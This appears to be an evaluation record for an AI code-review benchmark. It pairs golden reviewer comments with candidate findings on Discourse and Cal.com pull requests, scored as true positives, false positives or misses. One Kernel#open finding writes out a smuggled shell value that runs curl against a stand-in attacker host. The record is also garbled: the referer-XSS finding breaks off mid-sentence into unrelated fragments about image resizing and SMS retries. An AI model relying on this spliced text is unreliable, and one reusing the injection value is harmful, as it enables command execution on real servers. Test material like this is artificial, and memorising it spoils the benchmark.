true_positives.golden_comment: The remove_member test uses xhr :put to call the remove_member action, but the route defines delete 'members' => 'groups#remove_member' requiring DELETE method.
true_positives.matched_candidate:
Spec test uses wrong HTTP verb for remove_member

The test `it "cannot remove members from automatic groups"` calls `xhr :put, :remove_member, group_id: 1, user_id: 42`. The route is `delete "members" => "groups#remove_member"`, so a PUT to action `remove_member` does not match any defined route. Rails raises `ActionController::UrlGenerationError` (or returns 404), not 422, so the test cannot pass and gives no real coverage of the automatic-group behavior.
true_positives.reasoning: Both identify the same HTTP verb mismatch: the remove_member test sends PUT, but the route requires DELETE.

true_positives.golden_comment: The route provides the group's ID in params[:id], but the code attempts to read it from params[:group_id], causing the action to fail. This results in a broken feature when trying to access group memberships.
true_positives.matched_candidate:
add_members and remove_member read group id from a param the route never sets

The new routes are defined as `put "members" => "groups#add_members"` and `delete "members" => "groups#remove_member"` inside `resources :groups` but outside a `collection do` block, making them member routes that generate `/admin/groups/:id/members` with the group id in `params[:id]`. The controller actions, however, call `Group.find(params.require(:group_id).to_i)` (line 66 in add_members and line 85 in remove_member). The production client in `discourse/models/group.js` hits `/admin/groups/<id>/members.json` with no `group_id` body parameter, so `params.require(:group_id)` always raises `ActionController::ParameterMissing`, returning a 400. The actual add/remove logic in these actions never runs in production.
true_positives.reasoning: Both identify the same route/controller parameter mismatch: the route supplies the group ID in params[:id], while the actions require params[:group_id], causing membership actions to fail.

false_positives.candidate:
add_members/remove_member specs do not match the actual route URLs

All new specs invoke the action by name with body params, e.g. `xhr :put, :add_members, group_id: group.id, usernames: ...` (line 103) and `xhr :delete, :remove_member, group_id: group.id, user_id: user.id` (line 125). The routes are member routes with URL `/admin/groups/:id/members`, so the URL helper `member_admin_group_path(id)` requires `:id`. The tests only supply `group_id` in the body, so the helper cannot generate a URL and each request raises `ActionController::UrlGenerationError`. These tests do not exercise the routes the JS actually hits, and even fixing the controller to use `params[:id]` will not make them pass.

findMembers has no in-flight tracking and can clobber pagination state

findMembers reads `offset`/`user_count` from the model, fires an AJAX request, and on response overwrites those properties with the server-provided values. The new admin template wires prev/next actions directly to findMembers with no request token, last-write-wins check, or debouncing. If a user clicks "next" twice quickly, two requests are in flight and responses can arrive out of order: a slow first-page response that returns after the second-page response will overwrite the model back to the first page, leaving the UI inconsistent with what the user clicked.

add_members silently drops unknown usernames with no feedback

`usernames.split(",").each do |username| ... if user = User.find_by_username(username) ... end` skips any unresolved username silently, and the action returns `success_json` regardless of how many (zero, one, or all) usernames actually matched. The admin UI triggers this from an "Add" button with no per-user feedback, so an admin who types a typo (e.g. "jonh" instead of "john") gets a 200 response and an unchanged member count, with no signal that the input was invalid.

Stray closing div inside each loop produces malformed DOM Inside `{{#each m in members}}`, line 19 contains a `` with no matching opening div in the loop body (the iteration body only contains `...`). The diff for this file only changes `model` to `members` on line 6, so the tag is pre-existing, but the file is part of this change set. It produces DOM that doesn't match the surrounding `` structure and should be removed.

Username selector not cleared after a successful add

The `addMembers` action carries a `// TODO: should clear the input` comment but never resets `usernames`. Membership changes used to flow through `saveWithUsernames`/`createWithUsernames`; now the only path that accepts usernames is this `addMembers` action, which leaves the typed names in the input. The next click on "Add" re-submits the same list unless the admin manually clears the field, and there is no client-side signal that the prior submission succeeded.

false_negatives.golden_comment: The findMembers() call is now asynchronous and unhandled. The controller may not have member data immediately available, creating a race condition.

In the next action, capping the next offset at user_count can produce an empty page (e.g., total equal to limit results in offset == total, showing 2/2 with no members). This can cause confusing UX on the last page.

The `totalPages` calculation using `Math.floor(user_count / limit) + 1` produces an extra page when `user_count` is an exact multiple of `limit`, leading to incorrect pagination. For example, with 100 users and a limit of 50, it reports 3 pages instead of 2, allowing navigation to an empty page.
Expected to return a value at the end of function - code paths without explicit returns will return undefined

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
should_block? performs a DB write during read-only validation

should_block? is named like a predicate but has the side effect of incrementing match_count and updating last_match_at whenever a record exists. The EmailValidator (lib/validators/email_validator.rb) calls it on every email validation, including runs that ultimately fail to save the user. Consequences: (1) match_count gets incremented even when the signup ultimately fails for unrelated reasons, distorting statistics; (2) every blocked-email signup now performs an extra UPDATE on the blocked_emails table inside what should be a validation pass, increasing contention; (3) if record.save fails it is silently swallowed, leaving an inconsistent mix of "returned true because record existed" but with no recorded hit. The hit-recording logic should be split from the block check (e.g., a separate should_record_hit?) and only run on successful user creation, or at least on a successful save of the record.
true_positives.reasoning: Both identify the same underlying issue: a predicate-style blocked-email check unexpectedly writes statistics during a read or validation operation. The candidate explicitly describes incrementing match_count and updating last_match_at, along with contention concerns, matching the golden comment's side-effect and concurrency concerns.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Case-sensitive blocked-email lookup lets blocked addresses slip through

EmailValidator calls BlockedEmail.should_block?(value) with the raw, mixed-case value supplied by the user. BlockedEmail.where(email: email).first is case-sensitive, and the migration's add_index :blocked_emails, :email, unique: true is a plain btree unique index (not citext / functional lower(email) index). Existing flows normalize emails to lowercase in some places (e.g., users_controller#change_email uses Email.downcase), but neither the BlockedEmail model nor the validator does any normalization. An admin who adds 'Spammer@Evil.com' to the blocklist will not stop a signup from 'spammer@evil.com', 'SPAMMER@evil.com', etc. Worse, because the unique index is case-sensitive, you cannot even add both casings as separate rows. Normalize via before_validation (self.email = Email.downcase(self.email.to_s).strip) and either store lowercase + add a functional unique index, or use a citext column.
true_positives.reasoning: Both identify the same underlying bug: case-sensitive email lookup in BlockedEmail.should_block? allows blocked users to bypass the blocklist by changing email capitalization. The candidate's additional index claim is inaccurate but does not change the core match.

false_positives.candidate:
record.save failure is silently swallowed

should_block? calls record.save with no error handling. If the save raises or returns false (e.g., a validation error on the BlockedEmail record, a DB error, or an ActionView::Template::Error from a future before_save), the exception bubbles up out of the EmailValidator and aborts user signup. The user sees a generic 500 instead of a clean validation message. At minimum, wrap in a rescue and log; ideally restructure so hit recording is not coupled to the block decision (see the related side-effect finding).

rejectedEmails list never cleared and is case-sensitive

rejectedEmails is initialized once as Em.A([]) and only ever pushObject'd to. It is never cleared, and the contains(email) check is case-sensitive. Consequences: (1) once a controller instance flags an email as rejected, the user cannot clear that rejection (e.g., if they fix a typo and try the corrected address it's fine, but if they re-type the same address with different casing, e.g. 'Bad@Spam.com' vs 'bad@spam.com', the rejection check silently misses it because the case-sensitive contains returns false even though the server already rejected it); (2) the array grows without bound for the lifetime of the controller. The pushObject site should normalize the email (e.g., toLowerCase()) on both insert and check, and there should be a way to clear it on success/reset.

Whitelist/blacklist branches of EmailValidator are untested

The only tests stub BlockedEmail.should_block? and never exercise the whitelist/blacklist code paths (SiteSetting.email_domains_whitelist / email_domains_blacklist). These paths were carried over verbatim from user.rb and were never tested before either, but now that the logic has been moved into a shared validator it's the right time to add coverage: an email rejected by the whitelist, an email rejected by the blacklist, and an email that passes both. Without tests, regressions in the gsub('.', '\.') / regexp interpolation (which is also unsafe if the setting contains regex metacharacters like '|' or '*') will slip in.

No test covers case-insensitive matching or the race condition

The model spec only exercises should_block? with an exact-case email and a single call. It does not cover (1) case-insensitive lookup, which is the main correctness gap of this PR (see EmailValidator finding), and (2) the lost-update race condition in match_count. At least one spec should demonstrate that 'Foo@Spam.com' blocks 'FOO@spam.com' (after the model is fixed), and a spec using threads or raw SQL should illustrate the concurrent-update behavior so the regression is caught if someone removes the atomic update later.

action_type not constrained to the Enum's values

validates :email, presence: true, uniqueness: true does not validate action_type, so the model will accept any integer (including ones not produced by BlockedEmail.actions). Add `validates :action_type, inclusion: { in: BlockedEmail.actions.values }` to fail fast on bad data. The `||=` in set_defaults only handles nil, not arbitrary invalid integers.

Missing trailing newline in email_validator.rb

The new file ends without a final newline (the diff explicitly notes "\ No newline at end of file"). Most Ruby tools, editors, and POSIX conventions expect source files to end with a newline. Add a trailing newline.

Domain setting interpolated directly into a regex

email_in_restriction_setting? builds the regex as Regexp.new("@(#{domains})", true). If the setting contains regex metacharacters other than '.' (e.g., '|', '*', '+', '(', '['), they are interpreted as regex syntax. This was carried over from the original user.rb implementation, but since the file is being touched anyway this is a good place to fix it: split the setting on commas/whitespace, Regexp.escape each entry, and join with '|'. Otherwise an admin who accidentally types 'foo.com|bar.com' (intending a list) silently changes the semantics.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
Invalid CSS property -ms-align-items in align-items mixin

The `align-items` mixin outputs `-ms-align-items: $alignment;` on line 121, but IE10/IE11 implement `align-items` as `-ms-flex-align` (already emitted on line 120). There is no `-ms-align-items` property in any CSS specification; the declaration is invalid and will be ignored by every browser. It should be removed.
true_positives.reasoning: Both identify -ms-align-items as an invalid legacy property and -ms-flex-align as the correct property for IE/Edge.

false_positives.candidate:
Invalid CSS property -webkit-order in order mixin

The `order` mixin outputs `-webkit-order: $val;` on line 129, but no browser ever shipped an `-webkit-order` property. The 2009 WebKit flexbox spec used `-webkit-box-ordinal-group` (already emitted on line 126) and the 2012/modern spec uses the unprefixed `order` (emitted on line 130). The `-webkit-order` declaration is dead/invalid CSS and should be removed.

Bullet badge vertical alignment likely broken in extra-info-wrapper

The change adds `line-height: 1.5` to `.extra-info-wrapper` and removes the `&.bullet { margin-top: 5px; }` rule that previously compensated for the bullet badge's vertical positioning inside this wrapper. The bullet badge in `badges.css.scss` is an `inline-flex` element with `align-items: baseline`; with the new explicit `line-height: 1.5` on the parent, the baseline metric changes and the deleted 5px top margin will cause the bullet to sit visibly higher (or lower) relative to the surrounding text, producing a vertical misalignment regression for category bullets in the topic header.

.small-action-desc loses left indent that compensated for the avatar

The `.small-action-desc` padding was changed from `padding: 0.5em 0 0.5em 4em; margin-top: 5px;` to `padding: 0 1.5%`. While the parent is now a flex container and the floated 45px avatar no longer overlaps the text, removing the 4em left indent means the description text now starts directly against the avatar (separated only by the default 0px flex gap and the small 1.5% inner padding). The old 4em indent was visually meaningful; the new layout will look noticeably more cramped, and the 0 vertical padding combined with `align-items: center` removes all internal breathing room around the description text. This is a visual regression even if no overlap occurs.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name method (without ?) is dead code; website_name not in untrusted_attributes

The serializer framework (ActiveModel::Serializer) looks for `include_website_name?` (with `?`) to determine if the attribute should be included. The manually defined `include_website_name` (without `?`) on line 153 is never called by the framework. It should either be renamed to `include_website_name?` (with `?`) or removed. Additionally, `website_name` is not in the `untrusted_attributes` list (line 105-111), so the auto-generated `include_website_name?` is not created. As a result, the `website_name` attribute is always included in the serialization (since `include_website_name?` is not defined, the framework includes it by default), which is inconsistent with the `website` attribute handling (which is in the `untrusted_attributes` list and hidden for TL0 users seen by anonymous). For TL0 users, the value would be nil, so it's not a privacy issue, but the inconsistency is a code quality concern.
true_positives.reasoning: The candidate identifies the same missing '?' suffix on include_website_name and its effect on conditional attribute inclusion. It does not address the golden comment's additional string-literal mutation concern, but it matches the primary underlying issue.

false_positives.candidate:
URI(website.to_s) is parsed multiple times

The `URI()` parsing is done 2-3 times in the `website_name` method (lines 138, 143, 146, 149). It should be cached in a local variable to avoid redundant parsing on every serialization. For example: `uri = URI(website.to_s)` and then use `uri.host` and `uri.path`.

NoMethodError if Discourse.current_hostname is nil

The `elsif` condition on line 144 calls `discourse_host.split('.').length`, which would raise `NoMethodError` if `discourse_host` is nil (e.g., in a background job or rake task where `Discourse.current_hostname` is not set). The method should handle the case where `Discourse.current_hostname` is nil, e.g., by returning just the `website_host` or treating the nil case as a non-match.

Missing tests for edge cases in website_name

The tests only cover three cases: different domain (discourse.org vs example.com), same domain (example.com vs example.com), and parent domain (forums.example.com vs example.com). Missing tests include: URL with port (e.g., http://example.com:8080/user), URL with query string (e.g., http://example.com/user?foo=bar), URL with fragment (e.g., http://example.com/user#section), URL with encoded characters, URL with different protocol (https vs http), URL with subdomain of instance domain (e.g., blog.forums.example.com for forums.example.com), URL with subdomain of website domain (e.g., forums.example.com for blog.example.com), URL with nil website, and URL with invalid website.

Subdomain matching logic may not handle all valid cases

The `elsif` branch only matches when both hosts have the same number of parts AND more than 2 parts. This misses cases like `a.b.example.com` (4 parts) vs `b.example.com` (3 parts) where the website is a subdomain of the instance domain. The `else` branch's `ends_with?` check handles this case, but the logic is split across two branches in a non-obvious way. Consider simplifying the logic or adding a comment explaining the cases.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on user-controlled URL enables shell injection and SSRF

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses Ruby's `Kernel#open`, which calls `Kernel#system` when the argument starts with `|`. A site administrator able to influence `feed_polling_url`, or any data source that ends up feeding it, could pass a string like `|curl evil.example/x|https://attacker/feed` to execute arbitrary commands on the host. Even without that, there is no timeout, no size cap, no redirect policy, and no URL validation, so the worker can be made to fetch internal addresses (SSRF: localhost, link-local IPs, AWS metadata endpoint `169.254.169.254`, etc.), or to hang on a slow peer. Replace with an HTTP client such as `Net::HTTP`/`Faraday` with an explicit timeout, an address whitelist, and an internal-IP blocklist.
true_positives.reasoning: The candidate explicitly identifies the same unvalidated feed_polling_url passed to open and the resulting SSRF risk of fetching arbitrary internal URLs. Its additional shell injection and resource-limit concerns do not negate this match.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
NoMethodError when feed item has no content

`content = CGI.unescapeHTML(i.content.scrub)` will raise `NoMethodError: undefined method scrub for nil` if any feed item omits `content` (or yields a nilable value depending on the feed shape). `i.title` is also passed straight into `TopicEmbed.import` and is rendered later as a topic title — a nil title causes a validation failure that propagates. Use `(i.content || '').scrub` and guard against nil titles.
true_positives.reasoning: The candidate identifies the same bug: calling scrub on nil i.content when an RSS item lacks content raises NoMethodError. Its empty-string fallback differs from the golden's description fallback, and it adds a title concern, but the underlying issue matches.

true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into JavaScript string

The line `parent.postMessage({...}, '<%= request.referer %>');` inserts the raw `request.referer` value into a JavaScript string literal. The controller's `ensure_embeddable` filter only checks `URI(request.referer || '').host != SiteSetting.embeddable_host`, which validates only the host portion, not the path or query string. `perform_retrieve` invokes `Jobs::PollFeed.new.execute({})` synchronously inside the worker handling `RetrieveTopic`. For example, `OptimizedImage.downsize(path, path, 100, 200)` would set `dimensions = 100` and `opts = 200` (an Integer), and any subsequent use of `opts[:force_aspect_ratio]` or `opts[:allow_animation]` will raise a `TypeError: no implicit conversion of Symbol into Integer` because `Integer` does not respond to `[]`. true_positives.matched_candidate:
Cleanup deleteMany uses retryCount > 1 without a method filter

The new branch of the cleanup `deleteMany` matches `{ retryCount: { gt: 1 } }` with no `method` constraint, while only the SMS code path ever increments `retryCount`. This silently couples the SMS implementation to the WorkflowReminder table as a whole: any future code that starts incrementing `retryCount` for email or WhatsApp reminders will have those rows deleted by this cron. Either constrain the OR-branch with `method: WorkflowMethods.SMS`, or document and enforce that retryCount is SMS-only.
true_positives.reasoning: Both identify the deletion OR branch's retryCount > 1 condition lacking a WorkflowMethods.SMS filter, allowing non-SMS reminders to be deleted. The candidate frames the impact as future-facing but identifies the same underlying bug and corrective filter.

false_positives.candidate:
Catch block increments retryCount for any error, not just SMS failures

The catch block increments retryCount for every exception thrown inside the try, including unrelated failures such as `prisma.profile.findFirst` (DB connection issue), `getCalEventResponses`, `getBookerBaseUrl`, `customTemplate`, and `smsReminderTemplate`. None of these have anything to do with Twilio being unable to schedule the SMS, yet each counts against the 2-retry budget. A transient infrastructure issue in any of those code paths can therefore cause a valid reminder to be auto-deleted on the next cron run before it ever gets a real second chance to reach Twilio. The retry increment should only fire when `twilio.scheduleSMS` actually returns falsy or throws — the other unrelated exceptions should bubble (or be separately handled) without poisoning the retry count.

No tests cover the new retry-and-delete behavior

The PR introduces a behavior change with real user-visible consequences (auto-deletion of workflow reminders after 2 failures), adds a new DB column, and changes the cleanup semantics of the existing `deleteMany`. No tests are added to cover: (1) `retryCount` incrementing on `twilio.scheduleSMS` returning falsy, (2) `retryCount` incrementing when the call throws, (3) the new OR-branch of `deleteMany` actually deleting rows with `retryCount > 1`, (4) the boundary case of `retryCount == 1` being retried once more before deletion, and (5) successful sends still setting `scheduled: true`/`referenceId` regardless of retryCount. Without these tests, regressions in retry accounting or the cleanup query can ship unnoticed.

Caching tests removed while caching logic remains in service

The 'Caching' describe block (which previously verified that getAuthorizationConditions() and getFilterConditions() returned the same value on repeated calls) was removed entirely from the test file. The service still contains the caching implementation in lines 84-87 and 91-94 (`this.cachedAuthConditions` / `this.cachedFilterConditions` cache fields and the `if (this.cachedAuthConditions === undefined)` checks). Removing these tests is a regression in coverage: future refactors that silently break caching (e.g. accidentally re-fetching memberships on every call, losing the deduplication of identical `Prisma.sql` template-literal objects) would no longer be caught. The PR description also does not mention deleting caching tests, which can mislead reviewers.

Public findMany method removed, breaking any external consumers

The previous public API of `InsightsBookingService` was `findMany(findManyArgs: Prisma.BookingTimeStatusDenormalizedFindManyArgs)`. This method has been deleted and replaced with `getBaseConditions(): Promise<Prisma.Sql>`, which returns a `Prisma.Sql` fragment that callers must now embed in their own `prisma.$queryRaw` call. This is a breaking change to the service contract. The PR description does not mention updating other callers (e.g. insights API handlers or other modules that import this service). Before merging, every existing caller of `service.findMany(...)` must be migrated to use `getBaseConditions` + `$queryRaw`, otherwise the build will fail or runtime behavior will change.

Test redefines NOTHING_CONDITION independently from the service

The test file declares its own `const NOTHING_CONDITION = Prisma.sql`1=0`` (line 10) instead of importing the value from `insightsBooking.ts`, which keeps its own private copy of the same constant. If the service ever changes the definition of `NOTHING_CONDITION` (for example to `Prisma.sql`FALSE`` or some other falsy SQL expression), the assertions `expect(conditions).toEqual(NOTHING_CONDITION)` in this test file would still pass against the local copy, masking the regression. The service should export `NOTHING_CONDITION` and the tests should import it so both sides of the comparison are guaranteed to refer to the same value.

false_negatives.golden_comment: In getBaseConditions(), the else if (filterConditions) and final else branches are unreachable. This is because getAuthorizationConditions() always returns a non-null Prisma.Sql object, making authConditions always truthy, which means only the first two if/else if conditions are ever evaluated.

Fetching userIdsFromOrg only when teamsFromOrg.length > 0 can exclude org-level members for orgs without child teams; consider deriving from teamIds (which includes orgId) or removing the guard so org-only orgs still include member user bookings.

true_positives.golden_comment: The parseRefreshTokenResponse function incorrectly sets refresh_token to the hardcoded string 'refresh_token' when it's missing from the OAuth refresh token response. This invalidates the token, breaking subsequent token refreshes and causing authentication failures.
true_positives.matched_candidate:
Missing refresh token is replaced with the literal string "refresh_token"

When the parsed token response does not contain a `refresh_token`, the helper assigns `refreshTokenResponse.data.refresh_token = "refresh_token"` and stores the credential. The literal string "refresh_token" is not a valid OAuth refresh token, so on the very next refresh the provider will respond with `invalid_grant`, the credential will be invalidated, and (because it is now in the local DB) the user is stuck with a non-recoverable integration. The comment indicates the self-hoster's endpoint may return only `access_token` and `expiry_date`, in which case this branch is hit on every refresh. The function should refuse to mint a credential without a real refresh token, or fall back to the previously stored one.
true_positives.reasoning: Both identify the same bug: a missing refresh_token is replaced with the hardcoded literal "refresh_token", producing an invalid credential that breaks subsequent refreshes and authentication.

true_positives.golden_comment: The Zod schema in parseRefreshTokenResponse uses computed property keys [z.string().toString()] and [z.string().optional().toString()] in minimumTokenResponseSchema, which is invalid Zod syntax and will throw a runtime error.
true_positives.matched_candidate:
minimumTokenResponseSchema computed keys both evaluate to the same literal string

`[z.string().toString()]: z.number()` and `[z.string().optional().toString()]: z.unknown().optional()` use a Zod instance's default `Object.prototype.toString`, which returns the string `"[object Object]"` (zod does not override `toString` on ZodString / ZodOptional). Both expressions therefore evaluate to the same string. In an object literal the second property overwrites the first, so the schema collapses to `z.object({ access_token: z.string(), "[object Object]": z.unknown().optional() })`. The schema does not match the obvious intent ("any string key with a number value, plus any other properties"); it accepts any object that happens to have an `access_token` string and no other validation of the rest of the OAuth response. With this minimum schema in effect, callers will silently accept malformed token responses from the self-hoster's endpoint and store them, which then fails on subsequent use.
true_positives.reasoning: Both identify the same defective computed property keys in minimumTokenResponseSchema. The candidate explains how those keys collide and undermine validation, rather than describing the consequence as a runtime error, but it points to the same underlying schema-construction bug.

true_positives.golden_comment: parseRefreshTokenResponse returns a Zod safeParse result ({ success, data, error }), not the credential key object. Persisting that as key stores the wrapper instead of the token payload; we should store the parsed data or use schema parse.
true_positives.matched_candidate:
Credential key stored as the full safeParse result, not the parsed data

The new helper `parseRefreshTokenResponse` returns the `safeParse` envelope (`{ success, data }`). The Google Calendar service assigns that envelope directly to `key` and persists it: `const key = parseRefreshTokenResponse(googleCredentials, googleCredentialSchema); await prisma.credential.update({ where: { id: credential.id }, data: { key } });`. After the next refresh, `googleCredentialSchema.parse(credential.key)` will be parsing an object of shape `{ success: true, data: { access_token, refresh_token, ... } }`, which fails every required field check, so the credential becomes permanently invalid. Other call sites (office365calendar, salesforce, zoom) correctly read `.data`; this is the lone regression. The function should return just the data, or the call site should be `data: { key: key.data }`.
true_positives.reasoning: Both identify the same bug: parseRefreshTokenResponse returns a Zod safeParse wrapper, which is persisted as the credential key instead of the parsed token payload. Both recommend storing the parsed data or returning it directly.

true_positives.golden_comment: The Salesforce integration checks `response.statusText` instead of `response.ok` when handling OAuth token refresh responses. This can lead to unreliable behavior, as a successful response may not be correctly identified, resulting in the use of stale credentials and potential authentication failures.
true_positives.matched_candidate:
statusText-based HTTP check instead of response.ok

Salesforce's refresh path checks `if (response.statusText !== "OK") throw new HttpError(...)`. `response.statusText` is an arbitrary reason phrase that the server may or may not send and that `fetch` does not always populate; the canonical way is `if (!response.ok)`. As written, a 4xx/5xx whose `statusText` happens to be `"OK"` (some proxies / Salesforce errors do this) would be treated as success and the response body parsed as a token, with `parseRefreshTokenResponse` then `reject`ing; in the opposite direction, a perfectly valid 200 with statusText `""` (HTTP/2, some servers) would always be rejected. Use `response.ok` and read the body for the real error.
true_positives.reasoning: Both identify the Salesforce OAuth refresh path using response.statusText instead of response.ok, causing successful responses to be misclassified and unreliable authentication behavior.

true_positives.golden_comment: The `appCredentialWebhookRequestBodySchema.parse` function can throw on invalid payloads, resulting in 500 Internal Server Errors instead of the expected 400 Bad Request responses. This can lead to confusion for clients and hinder proper error handling.
true_positives.matched_candidate:
symmetricDecrypt / JSON.parse failures are unhandled

The block `JSON.parse(symmetricDecrypt(reqBody.keys, process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY || ""))` can throw in several ways: empty encryption key (falls back to `""`), wrong key, ciphertext tampered or not actually encrypted with this key, or successfully decrypted bytes that are not valid JSON. None of these are caught. A misconfigured self-hoster or any malformed payload will produce an unhandled 500, and the original ZodError from line 31 is similarly uncaught (would also 500 with the schema details). Both should be caught and returned as 4xx with a generic message, and the decryption/key-mismatch path should be logged.
true_positives.reasoning: Although primarily focused on decryption and JSON parsing, the candidate explicitly identifies the uncaught ZodError from schema parsing causing a 500 instead of a 4xx response, matching the golden issue.

false_positives.candidate:
Time-of-check/time-of-use race in credential upsert

The handler does `prisma.credential.findFirst` and then either `update` or `create` based on the result. There is no unique constraint on `(userId, appId)` in the credential model (the comment at line 61 even acknowledges this), and nothing atomic here. Two concurrent webhook deliveries for the same user/app can both see no existing credential and both attempt `create`, so one will fail with a unique-constraint / duplicate-key error (or succeed in creating a second row). The function does not wrap this in a transaction, does not use `upsert`, and does not catch the duplicate error and retry as an update. Result is a 500 for one of the two callers and/or duplicate credentials in the DB.

No HTTP method check; webhook accepts GET, HEAD, etc.

The handler does not check `req.method`. Anything other than POST will reach the body validation step, where `req.body` is typically undefined for GET, and `z.object({...}).parse(undefined)` will throw a ZodError, producing a 500 (and possibly leaking the expected schema in the response). The endpoint is a state-mutating webhook; it should explicitly `if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' })`.

Decrypted payload is stored as the credential key with no shape validation

After decrypting, the handler assigns `key: keys` to the credential, where `keys` is the result of `JSON.parse` (typed as `any`). There is no schema check that the decrypted value has the shape the downstream app expects (e.g. `{ access_token, refresh_token, expiry_date, ... }` for Google). Anyone holding the webhook secret and the encryption key can therefore overwrite an end-user's credential with arbitrary JSON. A compromised or buggy parent application could silently break a user's integration, and the next refresh would feed this malformed object into the per-app schemas (each of which has its own idea of the shape). Validate the parsed object against the target app's credential schema before persisting.

Webhook secret compared with non-constant-time string equality

The secret check is `req.headers[...] !== process.env.CALCOM_WEBHOOK_SECRET`, which short-circuits on the first differing byte. For a shared webhook secret the practical risk is low, but a remote attacker who can repeatedly send crafted requests and measure response times can in principle narrow down the secret byte-by-byte. Compare with a constant-time function such as `crypto.timingSafeEqual`.

Redundant prisma.app lookup; appStoreMetadata is the source of truth

The PR description states the parent's app store is the source of truth for apps, but this handler queries `prisma.app.findUnique({ where: { slug: reqBody.appSlug } })` and 404s if the local `app` row is missing. The `app` table is only populated by the app metadata sync (`CRON_ENABLE_APP_SYNC`, etc.), so a self-hoster whose env is fine but whose app sync has not run yet will see 404 for every valid slug. The very next line uses `appStoreMetadata[app.slug]`, which is the in-memory registry that the database is synced from, so the DB hit is unnecessary. Replace with `appStoreMetadata[reqBody.appSlug as keyof typeof appStoreMetadata]` and a single 404 if undefined.

APP_CREDENTIAL_SHARING_ENABLED is a string, not a boolean

`export const APP_CREDENTIAL_SHARING_ENABLED = process.env.CALCOM_WEBHOOK_SECRET && process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY;` uses `&&` rather than `!!(...)`. The value is therefore the encryption-key string (a non-empty string is truthy, so the constant is the second operand's value), or `undefined` when either is missing. Every use site does a truthy check, so behaviour accidentally works today, but the type is wrong, the name is misleading, and a stricter consumer that does `=== true` or `Boolean(APP_CREDENTIAL_SHARING_ENABLED)` would break. Should be `!!(process.env.CALCOM_WEBHOOK_SECRET && process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY)`.

Outbound refresh request to self-hoster endpoint is unauthenticated

When credential sharing is enabled, the Cal.com server POSTs to `process.env.CALCOM_CREDENTIAL_SYNC_ENDPOINT` with only `calcomUserId` and `appSlug` in the form body. There is no shared-secret header, no mTLS, no signature, and no per-user token; the only way the self-hoster can know the request is legitimate is by IP allowlist. The self-hoster's endpoint must return a valid access token to that Cal.com, so anyone able to reach the URL can mint tokens for arbitrary (calcomUserId, appSlug) pairs that the parent will then trust. Add an HMAC over the body using a shared secret (the same `CALCOM_WEBHOOK_SECRET` already configured would be the natural fit), or otherwise authenticate the caller.

Outbound refresh fetch has no timeout and no error handling

The `fetch` to `process.env.CALCOM_CREDENTIAL_SYNC_ENDPOINT` has no `AbortController` / timeout, no try/catch, and no response-status check. If the self-hoster's endpoint is slow, the entire Cal.com request handler that triggered the refresh hangs (booking flow, calendar lookup, etc.); if it returns 5xx or fails DNS, the unhandled rejection bubbles up. Wrap in a timeout (e.g. 5–10s) and treat any non-2xx or network error as a refresh failure (which should invalidate the credential, the way direct-OAuth refreshes already do).

Salesforce access token is refreshed on every API call

`getClient` is called from the constructor, before any expiry check, and unconditionally POSTs to the Salesforce token endpoint. There is no `isExpired` / `isTokenValid` short-circuit like the other integrations (Google, HubSpot, Lark, O365, Zoho) use. Every single Salesforce interaction (contact search, create event, update event, delete event) now incurs a synchronous network round trip to Salesforce, plus a credential-row write. Add the usual expiry check on `credentialKey.expires_in`/`expiry_date` and only call the refresh path when actually needed.

Header name is documented as lowercase but the code does not normalize

The .env.example comment says "This is the header name that will be used to verify the webhook secret. Should be in lowercase." The handler reads `req.headers[process.env.CALCOM_WEBHOOK_HEADER_NAME || "calcom-webhook-secret"]`. In Next.js / Node, incoming HTTP header names are lower-cased, but the configured `CALCOM_WEBHOOK_HEADER_NAME` is used as-is to index into `req.headers`. If a self-hoster sets it to anything but lower-case, the lookup silently fails and the request is rejected as 403 with no actionable message. Either enforce/document lowercase validation at startup, or normalize the configured name with `.toLowerCase()` before use.

New webhook endpoint and OAuth helpers have no tests

